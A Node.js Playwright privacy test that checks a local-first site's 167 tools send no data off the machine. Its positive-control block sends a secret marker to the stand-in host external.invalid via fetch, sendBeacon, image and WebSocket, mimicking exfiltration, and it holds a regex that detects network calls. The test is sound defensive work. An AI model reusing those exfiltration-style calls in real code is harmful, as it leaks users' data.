#!/usr/bin/env node
/**
 * Gate negativo de privacidad del sitio público.
 *
 * Recorre las 167 herramientas generadas y procesa un archivo que contiene un
 * marcador secreto. Todo request ajeno al servidor local se bloquea antes de
 * salir; el marcador no puede aparecer en URL, body o headers. El control
 * positivo comprueba fetch, beacon, imagen y WebSocket para que el monitor no
 * se convierta en una aserción vacía.
 */
import { createServer } from 'node:http';
import { existsSync, mkdirSync, readdirSync, readFileSync, statSync, writeFileSync } from 'node:fs';
import { dirname, extname, join, normalize, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';
import { writeEvidence } from './evidence-helper.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const dist = join(root, 'dist');
const artifactDir = join(root, 'artifacts', 'deep-audit', 'toolisto');
const tools = JSON.parse(readFileSync(join(root, 'src', 'data', 'tools.json'), 'utf8')).filter((tool) => tool.enabled);
const secret = 'TLST-PUBLIC-NET-CANARY-DETERMINISTIC';
const evidence = { suite: 'public-site-network-negative', secret, tools: tools.length, checks: [], requests: [], websocketAttempts: [], failures: [] };
const mime = { '.css': 'text/css', '.html': 'text/html', '.js': 'text/javascript', '.svg': 'image/svg+xml', '.json': 'application/json', '.wasm': 'application/wasm', '.gz': 'application/gzip', '.png': 'image/png', '.jpg': 'image/jpeg', '.pdf': 'application/pdf', '.woff2': 'font/woff2' };

function check(condition, name, detail = '') {
  evidence.checks.push({ name, pass: Boolean(condition), detail });
  if (!condition) evidence.failures.push(detail ? `${name}: ${detail}` : name);
}

function startServer() {
  const server = createServer((request, response) => {
    const pathname = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
    const file = normalize(join(dist, pathname === '/' ? 'index.html' : pathname.replace(/^\/+/, '')));
    if (!file.startsWith(dist) || !existsSync(file) || statSync(file).isDirectory()) { response.writeHead(404); response.end('Not found'); return; }
    response.writeHead(200, { 'Content-Type': mime[extname(file)] || 'application/octet-stream' });
    response.end(readFileSync(file));
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server)));
}

function firstPartyScripts(directory, files = []) {
  for (const entry of readdirSync(directory, { withFileTypes: true })) {
    const path = join(directory, entry.name);
    if (entry.isDirectory()) { firstPartyScripts(path, files); continue; }
    if (extname(path) === '.js') files.push(path);
  }
  return files;
}

const server = await startServer();
const base = `http://127.0.0.1:${server.address().port}`;
const browser = await chromium.launch({ headless: true });
const context = await browser.newContext({ acceptDownloads: true });
const page = await context.newPage();
const consoleErrors = [];
let collectConsole = true;

await context.addInitScript(() => {
  const OriginalWebSocket = window.WebSocket;
  window.__toolistoNetworkWebSockets = [];
  // No permite que una regresión abra un socket real durante el gate.
  window.WebSocket = class ToolistoBlockedWebSocket {
    constructor(url) {
      window.__toolistoNetworkWebSockets.push(String(url));
      throw new DOMException('WebSocket bloqueado por auditoría local-first', 'SecurityError');
    }
    static get CONNECTING() { return OriginalWebSocket.CONNECTING; }
    static get OPEN() { return OriginalWebSocket.OPEN; }
    static get CLOSING() { return OriginalWebSocket.CLOSING; }
    static get CLOSED() { return OriginalWebSocket.CLOSED; }
  };
});

await context.route('**/*', async (route) => {
  const request = route.request();
  const url = request.url();
  const local = url.startsWith(base + '/') || url === base;
  const inert = /^(blob|data|about):/.test(url);
  const record = { method: request.method(), url, postData: request.postData() || '', headers: request.headers(), external: !local && !inert, aborted: false };
  if (record.external) { record.aborted = true; evidence.requests.push(record); await route.abort('blockedbyclient'); return; }
  evidence.requests.push(record);
  await route.continue();
});
page.on('console', (message) => { if (collectConsole && message.type() === 'error') consoleErrors.push(message.text()); });
page.on('pageerror', (error) => { if (collectConsole) consoleErrors.push(error.message); });

try {
  for (const tool of tools) {
    const before = consoleErrors.length;
    const response = await page.goto(`${base}/${tool.slug}.html`, { waitUntil: 'domcontentloaded' });
    check(response?.status() === 200, `${tool.slug}: carga HTTP`, String(response?.status()));
    check(consoleErrors.length === before, `${tool.slug}: sin error de consola`, consoleErrors.slice(before).join(' | '));
  }

  // Flujo real de archivo: el secreto se lee y transforma sólo en el navegador.
  await page.goto(`${base}/codificar-base64.html`, { waitUntil: 'networkidle' });
  await page.locator('#fileInput').setInputFiles({ name: 'privado.txt', mimeType: 'text/plain', buffer: Buffer.from(secret, 'utf8') });
  await page.waitForFunction(() => !document.getElementById('runButton')?.disabled);
  await page.click('#runButton');
  await page.waitForFunction(() => document.getElementById('resultDialog')?.open);
  const result = await page.locator('#resultMessage').textContent();
  check(Boolean(result?.includes('Base64')), 'flujo real: archivo privado procesado localmente', result ? 'procesado' : 'sin resultado');

  // Control positivo: cada canal debe ser visible o bloqueado por el monitor.
  collectConsole = false;
  await page.evaluate((marker) => {
    fetch(`https://external.invalid/probe/fetch?marker=${marker}`, { method: 'POST', body: marker }).catch(() => {});
    navigator.sendBeacon(`https://external.invalid/probe/beacon?marker=${marker}`, marker);
    const image = new Image(); image.src = `https://external.invalid/probe/image?marker=${marker}`;
    try { new WebSocket(`wss://external.invalid/probe/socket?marker=${marker}`); } catch (_) {}
  }, secret);
  await page.waitForTimeout(350);

  const external = evidence.requests.filter((request) => request.external);
  const probes = external.filter((request) => request.url.includes('/probe/'));
  const unexpected = external.filter((request) => !request.url.includes('/probe/'));
  const realRequests = evidence.requests.filter((request) => !request.url.includes('/probe/'));
  const secretInRequest = realRequests.filter((request) => request.url.includes(secret) || request.postData.includes(secret) || Object.values(request.headers).some((value) => String(value).includes(secret)));
  const sockets = await page.evaluate(() => window.__toolistoNetworkWebSockets || []);
  evidence.websocketAttempts = sockets;
  evidence.requests = {
    external: external.length,
    probes: probes.length,
    unexpected: unexpected.map((request) => request.url),
    secretLeak: secretInRequest.length > 0,
  };
  check(unexpected.length === 0, 'cero egress externo durante las 167 herramientas', unexpected.map((request) => request.url).join(', '));
  check(probes.some((request) => request.url.includes('/fetch') && request.aborted), 'control: fetch externo interceptado');
  check(probes.some((request) => request.url.includes('/beacon') && request.aborted), 'control: sendBeacon externo interceptado');
  check(probes.some((request) => request.url.includes('/image') && request.aborted), 'control: imagen externa interceptada');
  check(sockets.some((url) => url.includes('/probe/socket') && url.includes(secret)), 'control: WebSocket externo bloqueado');
  check(secretInRequest.length === 0, 'marcador secreto ausente de URL, body y headers reales', JSON.stringify(secretInRequest));

  const scripts = firstPartyScripts(join(dist, 'js')).concat([join(dist, 'app.js'), join(dist, 'tool-processors.js')]);
  const primitives = scripts.flatMap((file) => {
    const content = readFileSync(file, 'utf8');
    const matches = content.match(/\bfetch\s*\(|\bXMLHttpRequest\b|\bsendBeacon\s*\(|\bWebSocket\s*\(/g) || [];
    return matches.map((match) => `${relative(dist, file)}: ${match}`);
  });
  check(primitives.length === 0, 'runtime público sin primitivas de red', primitives.join(', '));
  check(consoleErrors.length === 0, 'sin errores de consola no controlados', consoleErrors.join(' | '));
} finally {
  await browser.close();
  await new Promise((resolve) => server.close(resolve));
  mkdirSync(artifactDir, { recursive: true });
  evidence.total = evidence.checks.length;
  evidence.passed = evidence.checks.filter((entry) => entry.pass).length;
  evidence.failed = evidence.failures.length;
  writeEvidence(join(artifactDir, 'TLT-public-site-network-negative-evidence.json'), evidence);
}

console.log(`Public network-negative: ${evidence.passed}/${evidence.total} PASS; ${tools.length} herramientas.`);
if (evidence.failures.length) { console.error(evidence.failures.join('\n')); process.exit(1); }
